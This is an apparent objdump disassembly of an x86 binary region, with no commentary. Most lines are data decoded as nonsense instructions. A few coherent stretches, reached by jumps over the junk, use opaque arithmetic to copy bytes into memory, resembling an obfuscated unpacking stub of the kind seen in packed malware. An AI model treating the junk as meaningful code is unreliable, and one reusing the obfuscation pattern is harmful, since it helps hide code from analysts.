  409fe3:	inc    esi
  409fe4:	mov    ch,0x11
  409fe6:	mov    eax,DWORD PTR [ecx]
  409fe8:	mov    ds:0x82c32ad,al
  409fed:	dec    ebx
  409fee:	mov    edx,DWORD PTR [ebx+edi*4+0x5f4e310f]
  409ff5:	aaa    
  409ff6:	data16 jae 0x409fd7
  409ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ffa:	rcr    DWORD PTR [ebx-0x416c8b60],0x92
  40a001:	stos   DWORD PTR es:[edi],eax
  40a002:	ja     0x40a004
  40a004:	adc    ebx,ebx
  40a006:	ror    BYTE PTR [ecx-0x4b],1
  40a009:	pop    ebx
  40a00a:	loop   0x40a02c
  40a00c:	and    ecx,DWORD PTR [edi]
  40a00e:	mov    edx,DWORD PTR [ebx]
  40a010:	int3   
  40a011:	call   0xcd97:0x482166c6
  40a018:	aam    0xd4
  40a01a:	xor    ebp,eax
  40a01c:	adc    al,0x2d
  40a01e:	or     edx,DWORD PTR [edi]
  40a020:	das    
  40a021:	pushf  
  40a022:	stos   DWORD PTR es:[edi],eax
  40a023:	cs inc ecx
  40a025:	dec    esp
  40a026:	mov    al,0x56
  40a028:	call   0x2063:0x73f3f660
  40a02f:	and    eax,0x1da7c51c
  40a034:	leave  
  40a035:	test   BYTE PTR [bx+si],dl
  40a038:	inc    ebx
  40a039:	(bad)  
  40a03a:	cmp    edi,DWORD PTR ds:0x9412037
  40a040:	nop
  40a041:	mov    al,0x3b
  40a043:	mov    al,0x61
  40a045:	out    0x83,al
  40a047:	sbb    DWORD PTR [ecx-0x50c2e7bf],edi
  40a04d:	out    0xd4,eax
  40a04f:	lods   eax,DWORD PTR ds:[esi]
  40a050:	push   cs
  40a051:	xor    eax,0x78704edb
  40a056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a057:	and    DWORD PTR [ecx-0x77a1dd6d],eax
  40a05d:	mov    ds:0xee4e6a7b,eax
  40a062:	sub    esi,DWORD PTR [ecx+0xf]
  40a065:	sbb    eax,0xd7b0cc61
  40a06a:	sbb    DWORD PTR [ebx],0xfffffffc
  40a06d:	lds    esi,FWORD PTR [ecx+0x17eaef6a]
  40a073:	mov    BYTE PTR [edi-0x73c72cd8],cl
  40a079:	fadd   QWORD PTR [esi]
  40a07b:	loopne 0x40a097
  40a07d:	leave  
  40a07e:	lahf   
  40a07f:	and    cl,BYTE PTR [ebp-0x80]
  40a082:	pop    esp
  40a083:	bound  ecx,QWORD PTR [edi]
  40a085:	push   0x16
  40a087:	inc    esp
  40a088:	inc    ebp
  40a089:	rcr    DWORD PTR [ecx-0x3bdd0461],1
  40a08f:	out    dx,al
  40a090:	imul   esi,DWORD PTR [ebx],0x3ca9a744
  40a096:	sti    
  40a097:	data16 mov BYTE PTR [ecx+eiz*4-0x20deb7d2],ch
  40a09f:	add    al,0x7
  40a0a1:	push   es
  40a0a2:	or     al,0xa3
  40a0a4:	dec    esi
  40a0a5:	aad    0xfb
  40a0a7:	mov    al,ds:0x70565812
  40a0ac:	cmp    al,0xf4
  40a0ae:	data16 es icebp 
  40a0b1:	or     BYTE PTR [esi+0x1f],0xbf
  40a0b5:	jbe    0x40a06a
  40a0b7:	inc    eax
  40a0b8:	loopne 0x40a0c9
  40a0ba:	(bad)  
  40a0bb:	in     eax,dx
  40a0bc:	imul   ebp,DWORD PTR [eax+0x51],0xa4550fc2
  40a0c3:	rcl    BYTE PTR [edx+0xd],0xba
  40a0c7:	lds    edi,FWORD PTR [ecx]
  40a0c9:	mov    eax,eax
  40a0cb:	jb     0x40a0a8
  40a0cd:	jle    0x40a0ec
  40a0cf:	mov    BYTE PTR [edi-0x418e1bc6],bl
  40a0d5:	inc    edx
  40a0d6:	adc    DWORD PTR [ecx+0x49cb190d],edi
  40a0dc:	xor    BYTE PTR [eax+ecx*2+0x690e813a],ch
  40a0e3:	(bad)  
  40a0e4:	and    BYTE PTR [edx],cl
  40a0e6:	jne    0x40a0bf
  40a0e8:	gs and eax,0x6fd9adca
  40a0ee:	daa    
  40a0ef:	fmul   st(4),st
  40a0f1:	mov    edx,DWORD PTR [ebp-0x14]
  40a0f4:	shrd   eax,edx,0x2
  40a0f8:	xor    eax,ecx
  40a0fa:	mov    ecx,DWORD PTR [ebp-0x18]
  40a0fd:	shr    edx,0x2
  40a100:	mov    edx,DWORD PTR [ebp-0x14]
  40a103:	xor    edx,edx
  40a105:	shl    ecx,0x1e
  40a108:	or     eax,edx
  40a10a:	mov    ds:0x422830,eax
  40a10f:	pop    esi
  40a110:	leave  
  40a111:	ret    
  40a112:	push   ebp
  40a113:	mov    ebp,esp
  40a115:	sub    esp,0x28
  40a118:	push   ebx
  40a119:	push   esi
  40a11a:	push   edi
  40a11b:	mov    DWORD PTR [ebp-0x10],0x67e2
  40a122:	jmp    0x40a3b9
  40a127:	mov    al,ds:0xfc9cf9a5
  40a12c:	pushf  
  40a12d:	mov    al,ds:0xd54f94b9
  40a132:	jecxz  0x40a170
  40a134:	xchg   esi,eax
  40a135:	dec    esp
  40a136:	xchg   edx,eax
  40a137:	es xchg ebp,eax
  40a139:	mov    esi,0xbec2a9be
  40a13e:	mov    esi,0xdaef175f
  40a143:	sub    BYTE PTR [ebp-0x156bede3],bh
  40a149:	ins    BYTE PTR es:[edi],dx
  40a14a:	cmp    eax,0x1b714b73
  40a14f:	or     eax,0x16b9bd8
  40a154:	cmp    DWORD PTR [ebp+0x25024677],ebx
  40a15a:	loop   0x40a184
  40a15c:	ror    DWORD PTR [eax],0x54
  40a15f:	outs   dx,BYTE PTR ds:[esi]
  40a160:	imul   edx,DWORD PTR [ecx],0xffffffec
  40a163:	adc    ebx,DWORD PTR [edx]
  40a165:	and    al,0x71
  40a167:	data16 loopne 0x40a12b
  40a16a:	and    eax,0xeac4a856
  40a16f:	enter  0x51aa,0x66
  40a173:	sbb    DWORD PTR [ebx],eax
  40a175:	mov    dh,0xdd
  40a177:	pop    ds
  40a178:	pop    edi
  40a179:	cli    
  40a17a:	xchg   DWORD PTR [esi],ecx
  40a17c:	lock pusha 
  40a17e:	mov    BYTE PTR [edi+edi*8+0x33eb445a],dh
  40a185:	jmp    0x19faaddf
  40a18a:	popa   
  40a18b:	jns    0x40a1a9
  40a18d:	add    DWORD PTR [edx+0x7d977751],esi
  40a193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a194:	adc    cl,dl
  40a196:	and    ebx,ebx
  40a198:	hlt    
  40a199:	(bad)  
  40a19a:	jle    0x40a163
  40a19c:	cmp    DWORD PTR [edi+0x5],ebx
  40a19f:	jg     0x40a13d
  40a1a1:	sub    ah,BYTE PTR [esi]
  40a1a3:	fiadd  WORD PTR [esi-0xb]
  40a1a6:	jg     0x40a204
  40a1a8:	test   al,0xbc
  40a1aa:	das    
  40a1ab:	mov    edi,0xcd554723
  40a1b0:	test   DWORD PTR [bp-0x6b5b],esi
  40a1b5:	dec    eax
  40a1b6:	inc    esi
  40a1b7:	mov    al,0x17
  40a1b9:	lahf   
  40a1ba:	or     BYTE PTR [ecx-0x11],0x1c
  40a1be:	enter  0xd7e7,0x58
  40a1c2:	add    cl,BYTE PTR cs:[edx]
  40a1c5:	cs (bad) 
  40a1c7:	(bad)  
  40a1c8:	ror    DWORD PTR [edi],cl
  40a1ca:	jns    0x40a22e
  40a1cc:	dec    edi
  40a1cd:	fisub  DWORD PTR [edi]
  40a1cf:	and    al,0xa0
  40a1d1:	or     DWORD PTR [edx],0x85ccac3
  40a1d7:	add    eax,DWORD PTR [ebx+0x3f088efb]
  40a1dd:	imul   edi,DWORD PTR [edi+edi*1+0x9],0x80d79ede
  40a1e5:	and    dh,BYTE PTR [eax]
  40a1e7:	cld    
  40a1e8:	jns    0x40a1ff
  40a1ea:	test   BYTE PTR [ebp-0x1e],al
  40a1ed:	push   esp
  40a1ee:	sub    al,0xfc
  40a1f0:	add    DWORD PTR [eax],esi
  40a1f2:	(bad)  
  40a1f3:	push   ss
  40a1f4:	xlat   BYTE PTR ds:[ebx]
  40a1f5:	ss pusha 
  40a1f7:	xor    ecx,DWORD PTR [ecx-0x80]
  40a1fa:	add    BYTE PTR [edx+0x194991c],al
  40a200:	fnstsw WORD PTR [edi-0x78]
  40a203:	push   esi
  40a204:	sub    eax,0x7a8ed07c
  40a209:	sbb    al,0x55
  40a20b:	sbb    ch,BYTE PTR [esi-0x499c468a]
  40a211:	addr16 (bad) 
  40a213:	les    ebx,FWORD PTR [ebp-0x25]
  40a216:	mov    ebx,0x31fbdfe2
  40a21b:	imul   BYTE PTR [ebp+0x26]
  40a21e:	hlt    
  40a21f:	out    dx,eax
  40a220:	fimul  DWORD PTR [ebx+0xff7afeb]
  40a226:	test   al,0x93
  40a228:	push   esi
  40a229:	aad    0x77
  40a22b:	mov    dl,0x1c
  40a22d:	mov    edx,0x247407c5
  40a232:	dec    eax
  40a233:	rol    BYTE PTR [eax],0x48
  40a236:	fcom   DWORD PTR [esi+0x39d2207c]
  40a23c:	inc    eax
  40a23d:	loopne 0x40a1ea
  40a23f:	push   es
  40a240:	daa    
  40a241:	int3   
  40a242:	leave  
  40a243:	xchg   esp,eax
  40a244:	xor    ch,BYTE PTR [esi+0x541c0032]
  40a24a:	cmp    al,0xfb
  40a24c:	rcl    dl,1
  40a24e:	cmp    dh,BYTE PTR [ebx+esi*1+0x1080f23c]
  40a255:	add    ebx,ebx
  40a257:	push   es
  40a258:	das    
  40a259:	pop    ss
  40a25a:	mov    ebp,0x7481850
  40a25f:	int3   
  40a260:	or     eax,0x42164447
  40a265:	lods   al,BYTE PTR ds:[esi]
  40a266:	mov    ds:0x53cf6eb2,eax
  40a26b:	outs   dx,DWORD PTR ds:[esi]
  40a26c:	cdq    
  40a26d:	addr16 add ecx,esp
  40a270:	xchg   ebp,eax
  40a271:	loop   0x40a204
  40a273:	sbb    al,0xf8
  40a275:	arpl   WORD PTR [esi],cx
  40a277:	cdq    
  40a278:	xchg   ebp,eax
  40a279:	imul   edx,DWORD PTR [ebp+0x24],0xffffffb4
  40a27d:	ret    0xc1b
  40a280:	jmp    0xa2c:0x90f3089f
  40a287:	dec    esp
  40a288:	push   ecx
  40a289:	adc    eax,edx
  40a28b:	mov    esi,0x384160e5
  40a290:	(bad)  
  40a292:	sub    cl,BYTE PTR [ecx+0x69]
  40a295:	push   0x9e995c06
  40a29a:	les    edi,FWORD PTR [ecx+edi*4+0x59]
  40a29e:	jg     0x40a2ab
  40a2a0:	pop    ebx
  40a2a1:	adc    bh,BYTE PTR [eax+0x664a6751]
  40a2a7:	outs   dx,DWORD PTR ds:[esi]
  40a2a8:	test   BYTE PTR [edi],0x7a
  40a2ab:	add    ecx,ebx
  40a2ad:	mov    cl,0xa4
  40a2af:	jno    0x40a2f7
  40a2b1:	add    BYTE PTR [eax-0x320a25a6],cl
  40a2b7:	pushf  
  40a2b8:	mov    ds:0xd9c3688c,al
  40a2bd:	mov    dl,0x96
  40a2bf:	xchg   edi,eax
  40a2c0:	jne    0x40a293
  40a2c2:	in     al,0x14
  40a2c4:	lock in al,0xde
  40a2c7:	adc    al,0xec
  40a2c9:	push   ebp
  40a2ca:	xor    DWORD PTR [esi+0x7a],edi
  40a2cd:	popf   
  40a2ce:	jmp    0x30df:0xe0e6a949
  40a2d5:	sub    al,dl
  40a2d7:	shr    esp,0xdc
  40a2da:	(bad)
  40a2de:	sub    ebp,ebp
  40a2e0:	(bad)  
  40a2e1:	adc    al,0xa1
  40a2e3:	aas    
  40a2e4:	(bad)  
  40a2e5:	mov    ch,0x74
  40a2e7:	or     DWORD PTR [ebp-0x6e],0x8b26dd51
  40a2ee:	sub    esi,DWORD PTR [ebx]
  40a2f0:	leave  
  40a2f1:	or     esi,DWORD PTR [ebx]
  40a2f3:	sahf   
  40a2f4:	retf   
  40a2f5:	(bad)  
  40a2f6:	rcr    ah,1
  40a2f8:	data16 sub BYTE PTR [ecx],ah
  40a2fb:	ins    BYTE PTR es:[edi],dx
  40a2fc:	inc    ecx
  40a2fd:	loope  0x40a310
  40a2ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a300:	add    BYTE PTR [esi+0x1f782fdb],dh
  40a306:	(bad)  
  40a308:	jno    0x40a2f1
  40a30a:	out    dx,al
  40a30b:	shl    BYTE PTR [edx],cl
  40a30d:	loope  0x40a387
  40a30f:	jge    0x40a312
  40a311:	jecxz  0x40a2bd
  40a313:	repz push eax
  40a315:	inc    esi
  40a316:	jp     0x40a391
  40a318:	mov    ebx,0xe15bac55
  40a31d:	lds    eax,FWORD PTR [ebp-0x18]
  40a320:	inc    esp
  40a321:	pop    ecx
  40a322:	loope  0x40a2dc
  40a324:	mov    ebp,0xa3022065
  40a329:	test   eax,0xa9c06d71
  40a32e:	leave  
  40a32f:	or     ah,0xfa
  40a332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a333:	adc    al,0xbc
  40a335:	fistp  WORD PTR [ebp+0x73]
  40a338:	std    
  40a339:	xor    eax,0x2d7fa39c
  40a33e:	outs   dx,DWORD PTR ds:[esi]
  40a33f:	sbb    esp,0xffffffd2
  40a342:	test   bh,al
  40a344:	and    eax,DWORD PTR [eax]
  40a346:	in     eax,0x48
  40a348:	jne    0x40a2e4
  40a34a:	sbb    eax,0xb3e5ca70
  40a34f:	ins    DWORD PTR es:[edi],dx
  40a350:	test   eax,0x9d8dcff9
  40a355:	iret   
  40a356:	sbb    eax,0x65222709
  40a35b:	dec    ebp
  40a35c:	(bad)  
  40a35d:	xchg   esp,eax
  40a35e:	hlt    
  40a35f:	inc    ecx
  40a360:	das    
  40a361:	xchg   BYTE PTR [eax+0x40],bh
  40a364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a365:	sub    BYTE PTR [edx],0x69
  40a368:	xlat   BYTE PTR ds:[ebx]
  40a369:	pop    eax
  40a36a:	dec    ebp
  40a36b:	jmp    0x9009bf0c
  40a370:	aas    
  40a371:	popf   
  40a372:	sbb    bl,BYTE PTR [ebp+0x205719d7]
  40a378:	or     eax,0xc25fc0cf
  40a37d:	fnstsw WORD PTR [edx+0x1bd8f7ba]
  40a383:	aam    0xe7
  40a385:	and    cl,0x31
  40a388:	jecxz  0x40a33d
  40a38a:	mov    edx,0xf707b61c
  40a38f:	cmp    eax,0xf4b2dee
  40a394:	and    ebx,eax
  40a396:	jecxz  0x40a3ad
  40a398:	adc    DWORD PTR [ebx+eiz*8-0x5f],edx
  40a39c:	xchg   ebx,eax
  40a39d:	jecxz  0x40a32d
  40a39f:	mov    ecx,0xfbd513b3
  40a3a4:	repz sahf 
  40a3a6:	inc    eax
  40a3a7:	ins    DWORD PTR es:[edi],dx
  40a3a8:	addr16 add al,0x17
  40a3ab:	and    DWORD PTR [esi-0x22370ec3],ebp
  40a3b1:	outs   dx,BYTE PTR ds:[esi]
  40a3b2:	dec    ebp
  40a3b3:	inc    edx
  40a3b4:	popa   
  40a3b5:	je     0x40a379
  40a3b7:	adc    DWORD PTR [edi+eax*8],0x4726fc45
  40a3be:	add    BYTE PTR [eax],al
  40a3c0:	mov    DWORD PTR [ebp-0x8],0x580
  40a3c7:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40a3ce:	mov    DWORD PTR [ebp-0x28],0x3294
  40a3d5:	mov    DWORD PTR [ebp-0x24],0x643
  40a3dc:	mov    DWORD PTR [ebp-0x20],0x2545
  40a3e3:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40a3ea:	xor    ebx,ebx
  40a3ec:	inc    ebx
  40a3ed:	jmp    0x40a684
  40a3f2:	ins    DWORD PTR es:[edi],dx
  40a3f3:	shr    ebx,0x9a
  40a3f6:	jl     0x40a3b4
  40a3f8:	scas   eax,DWORD PTR es:[edi]
  40a3f9:	sub    bl,BYTE PTR [ebx+ebp*1-0x7a]
  40a3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fe:	jp     0x40a3af
  40a400:	pusha  
  40a401:	sahf   
  40a402:	adc    DWORD PTR [ebx-0x3d564142],ebx
  40a408:	mov    esi,0x43ad68be
  40a40d:	mov    DWORD PTR [ebp+eax*4+0x1d],ebx
  40a411:	cmc    
  40a412:	cmp    dh,dh
  40a414:	jp     0x40a3f2
  40a416:	sbb    al,0x60
  40a418:	aam    0xea
  40a41a:	and    BYTE PTR [eax-0x4772006d],cl
  40a420:	mov    cl,dh
  40a422:	sti    
  40a423:	add    edi,DWORD PTR [eax+0x7c]
  40a426:	jg     0x40a3cd
  40a428:	mov    bl,0xc0
  40a42a:	pop    ebx
  40a42b:	xor    BYTE PTR [ebx+esi*1-0xd],al
  40a42f:	jmp    0x6a77:0x3391d510
  40a436:	inc    eax
  40a437:	xor    DWORD PTR [esi],ebx
  40a439:	add    al,0xa4
  40a43b:	inc    edi
  40a43c:	jb     0x40a4b9
  40a43e:	cdq    
  40a43f:	mov    ebx,0x32ff8672
  40a444:	std    
  40a445:	imul   ecx,DWORD PTR [esi-0x15b3dec2],0x2a
  40a44c:	outs   dx,DWORD PTR ds:[esi]
  40a44d:	pusha  
  40a44e:	and    DWORD PTR [esi-0x20],0x47cbd71c
  40a455:	js     0x40a43c
  40a457:	xor    bl,BYTE PTR [edi]
  40a459:	test   eax,0x5b163023
  40a45e:	xchg   ecx,ecx
  40a460:	data16 stc 
  40a462:	jl     0x40a3e5
  40a464:	mov    dl,0x94
  40a466:	mov    BYTE PTR [ecx+0x4e],ah
  40a469:	jno    0x40a434
  40a46b:	fs jle 0x40a4ba
  40a46e:	(bad)
  40a471:	in     al,0x8c
  40a473:	and    esi,DWORD PTR [ebp+0x1]
  40a476:	cmp    ah,bh
  40a478:	call   FWORD PTR [eax+0x69155479]
  40a47e:	popa   
  40a47f:	in     eax,dx
  40a480:	xchg   BYTE PTR [edi],ah
  40a482:	jl     0x40a434
  40a484:	sbb    esp,DWORD PTR [ebp+0x56b570a9]
  40a48a:	push   es
  40a48b:	gs ret 0xe3ae
  40a48f:	jl     0x40a47e
  40a491:	call   0xf2a4:0xbe2daf6d
  40a498:	nop
  40a499:	ins    DWORD PTR es:[edi],dx
  40a49a:	mov    edx,0x40035f86
  40a49f:	cmc    
  40a4a0:	jmp    0x7d777712
  40a4a5:	xchg   edi,eax
  40a4a6:	or     eax,0x414ad1e1
  40a4ab:	hlt    
  40a4ac:	lahf   
  40a4ad:	adc    al,0xc
  40a4af:	or     DWORD PTR [esi],0x44
  40a4b2:	adc    BYTE PTR [ebx-0x4b],ah
  40a4b5:	icebp  
  40a4b6:	repz xor al,0x7f
  40a4b9:	scas   al,BYTE PTR es:[edi]
  40a4ba:	(bad)  
  40a4bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4bc:	stc    
  40a4bd:	pop    ss
  40a4be:	cmp    al,0xae
  40a4c0:	loopne 0x40a4c2
  40a4c2:	adc    BYTE PTR [ebx+0x49],cl
  40a4c5:	and    ch,BYTE PTR [edi]
  40a4c7:	pop    edi
  40a4c8:	xchg   edi,eax
  40a4c9:	mov    ecx,0x95022f16
  40a4ce:	pop    ss
  40a4cf:	add    eax,0xaf192ba5
  40a4d4:	test   eax,0xcd6b30e6
  40a4da:	es fsub st(4),st
  40a4dd:	retf   0xf0fa
  40a4e0:	mov    ebp,esp
  40a4e2:	inc    ebx
  40a4e3:	fsub   QWORD PTR [esi+0x37]
  40a4e6:	cmp    dl,BYTE PTR [ebx-0x2d47996a]
  40a4ec:	ja     0x40a561
  40a4ee:	sbb    al,BYTE PTR [ebp-0x15]
  40a4f1:	jg     0x40a496
  40a4f3:	das    
  40a4f4:	sub    esi,ecx
  40a4f6:	cld    
  40a4f7:	push   0x75
  40a4f9:	cs sbb al,0xdf
  40a4fc:	dec    edi
  40a4fd:	xor    bl,BYTE PTR [edi+0x16]
  40a500:	rol    DWORD PTR [ecx+0x2f62fff],cl
  40a506:	sbb    BYTE PTR ds:0x6437576f,0xbe
  40a50d:	jno    0x40a533
  40a50f:	aaa    
  40a510:	data16 fucomp st(6)
  40a513:	rol    BYTE PTR [ebp-0x61],1
  40a516:	sbb    edi,ecx
  40a518:	(bad)  [eax+0xb]
  40a51b:	sti    
  40a51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a51d:	std    
  40a51e:	sub    edi,0xcc34604d
  40a524:	xchg   esp,eax
  40a525:	sbb    dl,0xc8
  40a528:	ret    0xe9d3
  40a52b:	cmp    eax,0x2d34fd1c
  40a530:	push   ebx
  40a531:	std    
  40a532:	data16 xor bh,BYTE PTR [edi]
  40a535:	sahf   
  40a536:	lahf   
  40a537:	hlt    
  40a538:	pop    es
  40a539:	mov    dh,0xb9
  40a53b:	jbe    0x40a591
  40a53d:	shl    DWORD PTR [ebx+0x3c],0xd3
  40a541:	jl     0x40a5aa
  40a543:	push   eax
  40a544:	js     0x40a59b
  40a546:	push   esp
  40a547:	call   0xf253:0xb9c71c01
  40a54e:	xchg   esp,eax
  40a54f:	pop    esi
  40a550:	outs   dx,DWORD PTR ds:[esi]
  40a551:	popa   
  40a552:	xchg   esp,eax
  40a553:	sbb    eax,DWORD PTR [edi-0x695c60ae]
  40a559:	mov    bh,0xa7
  40a55b:	mov    edi,0xd7e288b2
  40a560:	mov    ecx,0x9a7b260b
  40a565:	outs   dx,BYTE PTR ds:[esi]
  40a566:	faddp  st(0),st
  40a568:	mov    ?,WORD PTR [ebx-0x21]
  40a56b:	sbb    eax,0x5f76627
  40a570:	adc    DWORD PTR [edi-0x60],0x9708e39b
  40a577:	sbb    eax,0x892b266a
  40a57c:	fdiv   st,st(7)
  40a57e:	xchg   esi,eax
  40a57f:	mov    esi,?
  40a581:	xchg   edi,eax
  40a582:	dec    esp
  40a583:	test   ah,cl
  40a585:	repz jo 0x40a528
  40a588:	fidiv  WORD PTR [ebx+0x4bb0cc04]
  40a58e:	rol    DWORD PTR [esi],cl
  40a590:	loopne 0x40a559
  40a592:	add    DWORD PTR [ebx-0x3685c2ff],esp
  40a598:	addr16 imul ecx,eax,0xa27c18e2
  40a59f:	cmp    bh,BYTE PTR [eax-0x4a]
  40a5a2:	xchg   ebp,eax
  40a5a3:	scas   al,BYTE PTR es:[edi]
  40a5a4:	(bad)  [ecx-0x40718be]
  40a5aa:	ss scas eax,DWORD PTR es:[edi]
  40a5ac:	fdivr  st,st(6)
  40a5ae:	dec    esi
  40a5af:	jg     0x40a5dc
  40a5b1:	mov    eax,ds:0xd80012ca
  40a5b6:	lods   al,BYTE PTR ds:[esi]
  40a5b7:	ja     0x40a5b1
  40a5b9:	(bad)  
  40a5ba:	loope  0x40a598
  40a5bc:	push   ebx
  40a5bd:	jnp    0x40a604
  40a5bf:	sub    eax,ebp
  40a5c1:	dec    ebp
  40a5c2:	popf   
  40a5c3:	add    dh,bh
  40a5c5:	push   ds
  40a5c6:	jne    0x40a638
  40a5c8:	icebp  
  40a5c9:	mov    eax,0x4854f7e5
  40a5ce:	push   ss
  40a5cf:	cmovg  edx,DWORD PTR [edi-0x4b]
  40a5d3:	in     al,0xdb
  40a5d5:	cmp    al,0x87
  40a5d7:	ja     0x40a5a1
  40a5d9:	mov    bh,0x93
  40a5db:	xchg   esp,eax
  40a5dc:	or     ecx,DWORD PTR [edx+0x40cc27b7]
  40a5e2:	retf   0x16d5
  40a5e5:	mov    ecx,0xbb8a007e
  40a5ea:	inc    edi
  40a5eb:	mov    bh,0xfd
  40a5ed:	jp     0x40a666
  40a5ef:	mov    ch,0x2f
  40a5f1:	sbb    edx,DWORD PTR [ebp-0x7314f7d5]
  40a5f7:	ja     0x40a5a6
  40a5f9:	pop    esp
  40a5fa:	push   ecx
  40a5fb:	and    bh,BYTE PTR [eax+0x2036d569]
  40a601:	jbe    0x40a5cc
  40a603:	loopne 0x40a5b5
  40a605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a606:	xor    BYTE PTR [esi+0x1d],0x10
  40a60a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a60b:	aas    
  40a60c:	mov    ds:0x9cc30a50,al
  40a611:	jae    0x40a5bf
  40a613:	out    0x30,eax
  40a615:	jmp    0xca005763
  40a61a:	les    ebx,FWORD PTR [esp+ecx*8-0x4b]
  40a61e:	and    ch,BYTE PTR [edx+edi*2]
  40a621:	pusha  
  40a622:	xor    ebp,eax
  40a624:	mov    ds:0x5e2ad36d,eax
  40a629:	pop    edx
  40a62a:	inc    eax
  40a62b:	mov    eax,ds:0xc2e82645
  40a630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a631:	test   BYTE PTR [eax],ch
  40a633:	cmp    DWORD PTR es:[ecx],esi
  40a636:	cmp    eax,0x3a72d619
  40a63b:	mov    edi,0x8aebcb45
  40a640:	adc    al,0x8
  40a642:	loope  0x40a64d
  40a644:	call   0x3fe3:0xa87a4029
  40a64b:	sub    dh,0x13
  40a64e:	push   ebx
  40a64f:	mov    dl,0x68
  40a651:	sub    al,0xd9
  40a653:	leave  
  40a654:	(bad)  
  40a655:	pop    ds
  40a656:	call   FWORD PTR [ebp+0x1d]
  40a659:	pop    ebx
  40a65a:	or     al,0xe0
  40a65c:	(bad)
  40a65f:	sti    
  40a660:	lahf   
  40a661:	aas    
  40a662:	call   0x3a69e84d
  40a667:	out    0xd7,eax
  40a669:	test   BYTE PTR [ebp+ebx*2-0x78e61e29],cl
  40a670:	xchg   BYTE PTR [ebx+edx*8+0x13],ah
  40a674:	int3   
  40a675:	das    
  40a676:	daa    
  40a677:	push   eax
  40a678:	sub    ebx,DWORD PTR [ecx]
  40a67a:	out    0x59,eax
  40a67c:	sbb    eax,0x36cbba2c
  40a681:	out    dx,al
  40a682:	(bad)  
  40a683:	fimul  WORD PTR [ecx+0x45c7e85d]
  40a689:	in     al,dx
  40a68a:	mov    cl,0x76
  40a68c:	add    BYTE PTR [eax],al
  40a68e:	mov    ecx,DWORD PTR [ebp-0x8]
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	sub    ecx,eax
  40a696:	add    ecx,DWORD PTR [ebp-0xc]
  40a699:	add    ecx,DWORD PTR [ebp-0x10]
  40a69c:	imul   ecx,ecx,0x1f80
  40a6a2:	add    ecx,0x727e
  40a6a8:	xor    ecx,0x106c92f2
  40a6ae:	mov    DWORD PTR [ebp-0x8],0x113c
  40a6b5:	mov    DWORD PTR [ebp-0xc],0x3d61
  40a6bc:	mov    DWORD PTR [ebp-0x10],0x16e9
  40a6c3:	mov    DWORD PTR [ebp-0x4],0x21aa
  40a6ca:	mov    eax,DWORD PTR [ebp-0x10]
  40a6cd:	or     eax,0x3611
  40a6d2:	add    eax,DWORD PTR [ebp-0xc]
  40a6d5:	mov    edx,DWORD PTR [ebp-0x8]
  40a6d8:	and    eax,edx
  40a6da:	mov    edx,ecx
  40a6dc:	sub    edx,eax
  40a6de:	mov    eax,DWORD PTR [ebp-0x4]
  40a6e1:	mov    esi,DWORD PTR ds:0x422728
  40a6e7:	mov    esi,DWORD PTR [esi+0x1cc]
  40a6ed:	add    eax,0x6772
  40a6f2:	or     eax,0x1f24
  40a6f7:	sub    eax,0x7046
  40a6fc:	xor    eax,0x497a
  40a701:	sub    esi,eax
  40a703:	mov    eax,DWORD PTR [ebp+0x8]
  40a706:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40a70d:	mov    BYTE PTR [esi+ecx*1],al
  40a710:	mov    eax,DWORD PTR [ebp-0x14]
  40a713:	mov    esi,DWORD PTR [ebp-0x18]
  40a716:	and    eax,0x2389
  40a71b:	xor    eax,0x695
  40a720:	xor    edx,edx
  40a722:	div    esi
  40a724:	lea    ecx,[ecx+eax*1-0x2413]
  40a72b:	mov    eax,DWORD PTR [ebp-0x1c]
  40a72e:	add    eax,DWORD PTR [ebp-0x20]
  40a731:	mov    edx,DWORD PTR [ebp-0x24]
  40a734:	and    eax,edx
  40a736:	mov    edx,DWORD PTR [ebp-0x28]
  40a739:	imul   eax,edx
  40a73c:	mov    edx,0xd0c8f
  40a741:	sub    edx,eax
  40a743:	cmp    ecx,edx
  40a745:	jbe    0x40a6ae
  40a74b:	push   0x2
  40a74d:	pop    eax
  40a74e:	mov    DWORD PTR [ebp-0x1c],eax
  40a751:	mov    DWORD PTR [ebp-0x20],ebx
  40a754:	mov    DWORD PTR [ebp-0x24],0x5
  40a75b:	mov    DWORD PTR [ebp-0x28],0x6686
  40a762:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40a769:	mov    DWORD PTR [ebp-0x4],eax
  40a76c:	mov    DWORD PTR [ebp+0x8],0x739a
  40a773:	mov    DWORD PTR [ebp-0xc],0xf3a
  40a77a:	xor    edx,edx
  40a77c:	mov    DWORD PTR [ebp-0x10],0x429
  40a783:	mov    eax,DWORD PTR [ebp-0x28]
  40a786:	mov    ecx,DWORD PTR [ebp-0x24]
  40a789:	sub    eax,0x175c
  40a78e:	div    ecx
  40a790:	mov    ecx,DWORD PTR [ebp-0x20]
  40a793:	xor    edx,edx
  40a795:	mov    edi,0x4db5
  40a79a:	div    ecx
  40a79c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a79f:	xor    edx,edx
  40a7a1:	div    ecx
  40a7a3:	xor    edx,edx
  40a7a5:	mov    ecx,eax
  40a7a7:	mov    eax,DWORD PTR [ebp+0x8]
  40a7aa:	imul   ecx,ecx,0x2e01
  40a7b0:	mov    esi,DWORD PTR [ebp-0x4]
  40a7b3:	add    eax,edi
  40a7b5:	div    esi
  40a7b7:	mov    edx,DWORD PTR [ebp-0x8]
  40a7ba:	mov    esi,0x940a7
  40a7bf:	sub    ecx,0x16bea86
  40a7c5:	jmp    0x40aa5c
  40a7ca:	lds    ecx,FWORD PTR [ebp+0x709870ff]
